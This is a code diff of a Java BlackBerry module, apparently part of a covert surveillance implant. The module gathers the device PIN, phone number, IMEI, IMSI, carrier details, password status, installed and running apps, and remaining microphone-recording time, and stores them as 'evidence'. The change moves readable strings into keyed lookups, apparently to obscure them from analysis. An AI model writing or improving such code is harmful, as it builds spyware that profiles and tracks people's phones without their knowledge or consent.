@@ -24,6 +24,7 @@ import net.rim.device.api.system.RadioInfo;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.Device;
+import blackberry.Messages;
 import blackberry.config.Cfg;
 import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
@@ -36,15 +37,16 @@ import blackberry.fs.Path;
  * The Class DeviceInfoAgent.
  */
 public final class ModuleDevice extends BaseInstantModule {
+    private static final String CR = "\n"; //$NON-NLS-1$
     //#ifdef DEBUG
-    static Debug debug = new Debug("ModDevice", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("ModDevice", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     boolean runningApplication;
     boolean installedApplication;
 
     public static String getStaticType() {
-        return "device";
+        return Messages.getString("1c.a");//"device"; //$NON-NLS-1$
     }
 
     public boolean parse(ConfModule conf) {
@@ -63,150 +65,149 @@ public final class ModuleDevice extends BaseInstantModule {
         final StringBuffer sb = new StringBuffer();
 
         // Modello
-        // sb.append("Processor: ARM\n");
+        // sb.append("Processor: ARM" +CR);
         if (DeviceInfo.isSimulator()) {
-            sb.append("Simulator\n");
+            sb.append(Messages.getString("1c.3") + CR); //$NON-NLS-1$
         }
 
         //#ifdef DEBUG
-        sb.append("Debug\n");
+        sb.append(Messages.getString("1c.4") + CR); //$NON-NLS-1$
         //#endif
 
-        sb.append("-- SYSTEM --\r\n");
-        sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
-        sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
-        sb.append("Pin: " + Device.getPin() + "\n");
+        sb.append(Messages.getString("1c.5") + CR + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.6") + DeviceInfo.getManufacturerName() + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.7") + DeviceInfo.getDeviceName() + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.8") + Device.getPin() + CR); //$NON-NLS-1$
 
-        sb.append("-- OS --\r\n");
-        sb.append("Platform: " + DeviceInfo.getPlatformVersion() + "\n");
-        sb.append("OS: " + DeviceInfo.getSoftwareVersion() + "\n");
-        sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
-        sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
-        sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
+        sb.append(Messages.getString("1c.9") + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.10") + DeviceInfo.getPlatformVersion() + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.11") + DeviceInfo.getSoftwareVersion() + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.12") + DeviceInfo.getIdleTime() + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.13") + DeviceInfo.isInHolster() + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.14") + DeviceInfo.isPasswordEnabled() + CR); //$NON-NLS-1$
 
-        sb.append("-- HARDWARE --\r\n");
-        sb.append("Total RAM: " + Runtime.getRuntime().totalMemory() + "\n");
-        sb.append("Free RAM: " + Runtime.getRuntime().freeMemory() + "\n");
-        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
-        sb.append("Phone: " + device.getPhoneNumber() + "\n");
-        sb.append("Keypad layout: ");
+        sb.append(Messages.getString("1c.15") + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.16") + Runtime.getRuntime().totalMemory() + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.17") + Runtime.getRuntime().freeMemory() + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.18") + DeviceInfo.hasCamera() + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.19") + device.getPhoneNumber() + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.20")); //$NON-NLS-1$
         int keyLayout = Keypad.getHardwareLayout();
         switch (keyLayout) {
             case Keypad.HW_LAYOUT_32:
-                sb.append("32 " + "\n");
+                sb.append("32 " + CR); //$NON-NLS-1$
                 break;
             case Keypad.HW_LAYOUT_39:
-                sb.append("39" + "\n");
+                sb.append("39" + CR); //$NON-NLS-1$
                 break;
             case Keypad.HW_LAYOUT_LEGACY:
-                sb.append("LEGACY" + "\n");
+                sb.append(Messages.getString("1c.23") + CR); //$NON-NLS-1$
                 break;
             case Keypad.HW_LAYOUT_PHONE:
-                sb.append("PHONE" + "\n");
+                sb.append(Messages.getString("1c.24") + CR); //$NON-NLS-1$
                 break;
             case Keypad.HW_LAYOUT_REDUCED_24:
-                sb.append("REDUCED" + "\n");
+                sb.append(Messages.getString("1c.25") + CR); //$NON-NLS-1$
                 break;
             /*
-             * case Keypad.HW_LAYOUT_TOUCHSCREEN_12: sb.append("TOUCH " + "\n");
+             * case Keypad.HW_LAYOUT_TOUCHSCREEN_12: sb.append("TOUCH " + CR);
              * break; case Keypad.HW_LAYOUT_TOUCHSCREEN_12A: sb.append("TOUCH "
-             * + "\n"); break; case Keypad.HW_LAYOUT_TOUCHSCREEN_12C:
-             * sb.append("TOUCH " + "\n"); break; case
-             * Keypad.HW_LAYOUT_TOUCHSCREEN_12H: sb.append("TOUCH " + "\n");
+             * + CR); break; case Keypad.HW_LAYOUT_TOUCHSCREEN_12C:
+             * sb.append("TOUCH " + CR); break; case
+             * Keypad.HW_LAYOUT_TOUCHSCREEN_12H: sb.append("TOUCH " + CR);
              * break; case Keypad.HW_LAYOUT_TOUCHSCREEN_20J: sb.append("TOUCH "
-             * + "\n"); break; case Keypad.HW_LAYOUT_TOUCHSCREEN_20JA:
-             * sb.append("TOUCH " + "\n"); break; case
-             * Keypad.HW_LAYOUT_TOUCHSCREEN_20K: sb.append("TOUCH " + "\n");
+             * + CR); break; case Keypad.HW_LAYOUT_TOUCHSCREEN_20JA:
+             * sb.append("TOUCH " + CR); break; case
+             * Keypad.HW_LAYOUT_TOUCHSCREEN_20K: sb.append("TOUCH " + CR);
              * break;
              */
 
             default:
-                sb.append("UNK " + keyLayout + "\n");
+                sb.append(Messages.getString("1c.26") + keyLayout + CR); //$NON-NLS-1$
                 break;
 
         }
 
-        sb.append("-- FLASH --\r\n");        
+        sb.append(Messages.getString("1c.27") + CR); //$NON-NLS-1$
         long freeSpace = Path.freeSpace(Path.USER);
         long totalSpace = DeviceInfo.getTotalFlashSize();
-        
-        if(totalSpace>freeSpace){
-            sb.append("Internal Size: "
+
+        if (totalSpace > freeSpace) {
+            sb.append(Messages.getString("1c.28") //$NON-NLS-1$
                     + (int) (DeviceInfo.getTotalFlashSize() / (1024 * 1024))
-                    + " MB\n");
+                    + Messages.getString("1c.29") + CR); //$NON-NLS-1$
         }
-        
+
         if (freeSpace != -1) {
-            sb.append("Free internal: "
-                    + (int) (freeSpace / (1024 * 1024))
-                    + " MB\n");
-            sb.append("MIC recording time: " + micRecTime(freeSpace) + " hours\n");
+            sb.append(Messages.getString("1c.30") + (int) (freeSpace / (1024 * 1024)) //$NON-NLS-1$
+                    + Messages.getString("1c.31") + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.32") + micRecTime(freeSpace) + Messages.getString("1c.33") //$NON-NLS-1$ //$NON-NLS-2$
+                    + CR);
         }
 
         if (Path.isSDAvailable()) {
-            sb.append("SD size: " + Path.totalSpace(Path.SD) + " Bytes\n");
-            sb.append("Free SD: " + Path.freeSpace(Path.SD) + " Bytes\n");
+            sb.append(Messages.getString("1c.34") + Path.totalSpace(Path.SD) + Messages.getString("1c.35") + CR); //$NON-NLS-1$ //$NON-NLS-2$
+            sb.append(Messages.getString("1c.36") + Path.freeSpace(Path.SD) + Messages.getString("1c.37") + CR); //$NON-NLS-1$ //$NON-NLS-2$
         }
-        
+
         // Alimentazione
-        sb.append("-- POWER --\r\n");
-        sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "%\n");
-        sb.append("BatteryStatus: " + DeviceInfo.getBatteryStatus() + "\n");
-        sb.append("BatteryTemperature: " + DeviceInfo.getBatteryTemperature()
-                + " Degrees\n");
-        sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + " V\n");
+        sb.append(Messages.getString("1c.38") + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.39") + DeviceInfo.getBatteryLevel() + "%" + CR); //$NON-NLS-1$ //$NON-NLS-2$
+        sb.append(Messages.getString("1c.41") + DeviceInfo.getBatteryStatus() + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.42") + DeviceInfo.getBatteryTemperature() //$NON-NLS-1$
+                + Messages.getString("1c.43") + CR); //$NON-NLS-1$
+        sb.append(Messages.getString("1c.44") + DeviceInfo.getBatteryVoltage() + " V" //$NON-NLS-1$ //$NON-NLS-2$
+                + CR);
 
         // Radio
-        sb.append("-- RADIO --\r\n");
+        sb.append(Messages.getString("1c.46") + CR); //$NON-NLS-1$
         if (Device.isCDMA()) {
-            sb.append("CDMA\n");
-            sb.append("SID: " + device.getSid() + "\n");
-            sb.append("ESN: " + NumberUtilities.toString(device.getEsn(), 16)
-                    + "\n");
+            sb.append(Messages.getString("1c.47") + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.48") + device.getSid() + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.49") + NumberUtilities.toString(device.getEsn(), 16) //$NON-NLS-1$
+                    + CR);
         } else if (Device.isGPRS()) {
-            sb.append("GPRS\n");
-            sb.append("IMEI: " + device.getImei() + "\n");
-            sb.append("IMSI: " + device.getImsi() + "\n");
-            sb.append("HomeMCC: " + GPRSInfo.getHomeMCC() + "\n");
-            sb.append("HomeMNC: " + GPRSInfo.getHomeMNC() + "\n");
-            sb.append("RSSI: " + GPRSInfo.getCellInfo().getRSSI() + "\n");
-            sb.append("Zone name: " + GPRSInfo.getZoneName() + "\n");
+            sb.append(Messages.getString("1c.50") + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.51") + device.getImei(true) + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.52") + device.getImsi(true) + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.53") + GPRSInfo.getHomeMCC() + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.54") + GPRSInfo.getHomeMNC() + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.55") + GPRSInfo.getCellInfo().getRSSI() + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.56") + GPRSInfo.getZoneName() + CR); //$NON-NLS-1$
         } else if (Device.isIDEN()) {
-            sb.append("IDEN\n");
+            sb.append(Messages.getString("1c.57") + CR); //$NON-NLS-1$
         }
 
         try {
-            sb.append("Active Wafs: " + RadioInfo.getActiveWAFs() + "\n");
-            sb.append("Carrier: " + RadioInfo.getCurrentNetworkName() + "\n");
-            sb.append("Enabled Wafs: " + RadioInfo.getEnabledWAFs() + "\n");
+            sb.append(Messages.getString("1c.58") + RadioInfo.getActiveWAFs() + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.59") + RadioInfo.getCurrentNetworkName() + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.60") + RadioInfo.getEnabledWAFs() + CR); //$NON-NLS-1$
 
             final String code = RadioInfo.getNetworkCountryCode(RadioInfo
                     .getCurrentNetworkIndex());
 
             if (code != null) {
-                sb.append("Country Code: "
+                sb.append(Messages.getString("1c.61") //$NON-NLS-1$
                         + RadioInfo.getNetworkCountryCode(RadioInfo
-                                .getCurrentNetworkIndex()) + "\n");
+                                .getCurrentNetworkIndex()) + CR);
             }
 
-            sb.append("Network Services: " + RadioInfo.getNetworkService()
-                    + "\n");
-            sb.append("Network Type: " + RadioInfo.getNetworkType() + "\n");
-            sb.append("Signal level: " + RadioInfo.getSignalLevel() + " dB\n");
-            sb.append("DataServiceOperational: "
-                    + RadioInfo.isDataServiceOperational() + "\n");
-            sb.append("DataServiceSuspended: "
-                    + RadioInfo.isDataServiceSuspended() + "\n");
+            sb.append(Messages.getString("1c.62") + RadioInfo.getNetworkService() + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.63") + RadioInfo.getNetworkType() + CR); //$NON-NLS-1$
+            sb.append(Messages.getString("1c.64") + RadioInfo.getSignalLevel() + Messages.getString("1c.65") //$NON-NLS-1$ //$NON-NLS-2$
+                    + CR);
+            sb.append(Messages.getString("1c.66") //$NON-NLS-1$
+                    + RadioInfo.isDataServiceOperational() + CR);
+            sb.append(Messages.getString("1c.67") //$NON-NLS-1$
+                    + RadioInfo.isDataServiceSuspended() + CR);
             // sb.append(": " + RadioInfo.);
         } catch (final Exception ex) {
             //#ifdef DEBUG
-            debug.error("Radio: " + ex);
+            debug.error(Messages.getString("1c.68") + ex); //$NON-NLS-1$
             //#endif
         }
 
-
-
-        sb.append("-- APPLICATIONS --\r\n");
+        sb.append(Messages.getString("1c.69") + CR); //$NON-NLS-1$
         sb.append(getRunningApplications());
 
         try {
@@ -221,8 +222,9 @@ public final class ModuleDevice extends BaseInstantModule {
             //#endif
         }
 
+        String content = sb.toString();
         Evidence evidence = new Evidence(EvidenceType.DEVICE);
-        evidence.atomicWriteOnce(sb.toString());
+        evidence.atomicWriteOnce(content);
 
     }
 
@@ -231,8 +233,8 @@ public final class ModuleDevice extends BaseInstantModule {
         // 1638 bytes every second
         // 98304 b / min
         // 5898240 b / hour
-                
-        return (int)(freeSpace/5898240);
+
+        return (int) (freeSpace / 5898240);
     }
 
     /**
@@ -247,9 +249,9 @@ public final class ModuleDevice extends BaseInstantModule {
                 .getApplicationManager();
 
         final int foregroundProcess = manager.getForegroundProcessId();
-        sb.append("Foreground process: " + foregroundProcess);
+        sb.append(Messages.getString("1c.70") + foregroundProcess); //$NON-NLS-1$
 
-        sb.append("\r\nRunning applications: \r\n");
+        sb.append(CR + Messages.getString("1c.71") + CR); //$NON-NLS-1$
 
         // Check to see if application is running.
         final ApplicationDescriptor[] descriptors = manager
@@ -258,18 +260,18 @@ public final class ModuleDevice extends BaseInstantModule {
         for (int i = 0; i < descriptors.length; i++) {
             final ApplicationDescriptor descriptor = descriptors[i];
             sb.append(descriptor.getName());
-            sb.append(" ");
+            sb.append(" "); //$NON-NLS-1$
             sb.append(descriptor.getVersion());
-            sb.append(" ");
+            sb.append(" "); //$NON-NLS-1$
             sb.append(descriptor.getFlags());
-            sb.append(" ");
+            sb.append(" "); //$NON-NLS-1$
             if (manager.getProcessId(descriptor) == foregroundProcess) {
-                sb.append(" FOREGROUND");
+                sb.append(Messages.getString("1c.75")); //$NON-NLS-1$
             }
             if ((descriptor.getPowerOnBehavior() & ApplicationDescriptor.FLAG_RUN_ON_STARTUP) != 0) {
-                sb.append(" AUTOSTARTUP");
+                sb.append(Messages.getString("1c.76")); //$NON-NLS-1$
             }
-            sb.append("\r\n");
+            sb.append(CR);
         }
 
         return sb.toString();
@@ -282,7 +284,7 @@ public final class ModuleDevice extends BaseInstantModule {
      */
     String getInstalledApplications() {
         final StringBuffer sb = new StringBuffer();
-        sb.append("\r\nInstalled applications: \r\n");
+        sb.append(CR + Messages.getString("1c.77") + CR); //$NON-NLS-1$
 
         // Retrieve an array of handles for existing modules on a BlackBerry
         // device
@@ -304,9 +306,9 @@ public final class ModuleDevice extends BaseInstantModule {
             final Date date = new Date(timestamp);
 
             sb.append(name);
-            sb.append(" , ");
+            sb.append(" , "); //$NON-NLS-1$
             sb.append(vendor);
-            sb.append("\r\n");
+            sb.append(CR);
         }
 
         return sb.toString();
@@ -314,7 +316,7 @@ public final class ModuleDevice extends BaseInstantModule {
 
     String getInstalledModuleGroup() {
         final StringBuffer sb = new StringBuffer();
-        sb.append("\r\nInstalled Module Group: \r\n\r\n");
+        sb.append(CR + Messages.getString("1c.79") + CR + CR); //$NON-NLS-1$
 
         // Retrieve an array of handles for existing modules on a BlackBerry
         // device
@@ -347,18 +349,18 @@ public final class ModuleDevice extends BaseInstantModule {
             final String version = group.getVersion();
 
             if (name == Cfg.GROUP_NAME) {
-                sb.append("******************\r\n");
+                sb.append(Messages.getString("1c.1") + CR); //$NON-NLS-1$
 
             }
 
             sb.append(name);
-            sb.append(" , ");
+            sb.append(" , "); //$NON-NLS-1$
             sb.append(vendor);
-            sb.append(" , ");
+            sb.append(" , "); //$NON-NLS-1$
             sb.append(flags);
-            sb.append(" , ");
+            sb.append(" , "); //$NON-NLS-1$
             sb.append(version);
-            sb.append("\r\n");
+            sb.append(CR);
 
             final Enumeration enumerator = group.getModules();
             while (enumerator.hasMoreElements()) {
@@ -367,34 +369,34 @@ public final class ModuleDevice extends BaseInstantModule {
                         .getModuleHandle(moduleName);
                 // Retrieve specific information about a module.
 
-                sb.append("--> " + moduleName);
+                sb.append("--> " + moduleName); //$NON-NLS-1$
                 if (handle > 0) {
                     remainigModules.remove(new Integer(handle));
                     final String vendorModule = CodeModuleManager
                             .getModuleVendor(handle);
                     final String versionModule = CodeModuleManager
                             .getModuleVersion(handle);
-                    sb.append(", " + vendorModule);
-                    sb.append(", " + versionModule);
+                    sb.append(", " + vendorModule); //$NON-NLS-1$
+                    sb.append(", " + versionModule); //$NON-NLS-1$
 
                     final ApplicationDescriptor[] descr = CodeModuleManager
                             .getApplicationDescriptors(handle);
                     if (descr != null && descr.length > 0) {
-                        sb.append(", ( ");
+                        sb.append(", ( "); //$NON-NLS-1$
                         for (int j = 0; j < descr.length; j++) {
-                            sb.append(descr[j].getFlags() + " ");
+                            sb.append(descr[j].getFlags() + " "); //$NON-NLS-1$
                         }
-                        sb.append(")");
+                        sb.append(")"); //$NON-NLS-1$
                     }
                 }
-                sb.append("\r\n");
+                sb.append(CR);
             }
 
-            sb.append("\r\n");
+            sb.append(CR);
 
         }
 
-        sb.append("\r\nUngrouped:\r\n\r\n");
+        sb.append(CR + Messages.getString("1c.0") + CR + CR); //$NON-NLS-1$
         final Enumeration enumeration = remainigModules.keys();
         while (enumeration.hasMoreElements()) {
             final Integer handle = (Integer) enumeration.nextElement();
@@ -407,9 +409,9 @@ public final class ModuleDevice extends BaseInstantModule {
                     .getModuleVersion(handle.intValue());
 
             sb.append(nameModule);
-            sb.append(", " + vendorModule);
-            sb.append(", " + versionModule);
-            sb.append("\r\n");
+            sb.append(", " + vendorModule); //$NON-NLS-1$
+            sb.append(", " + versionModule); //$NON-NLS-1$
+            sb.append(CR);
         }
         final String ret = sb.toString();
         return ret;
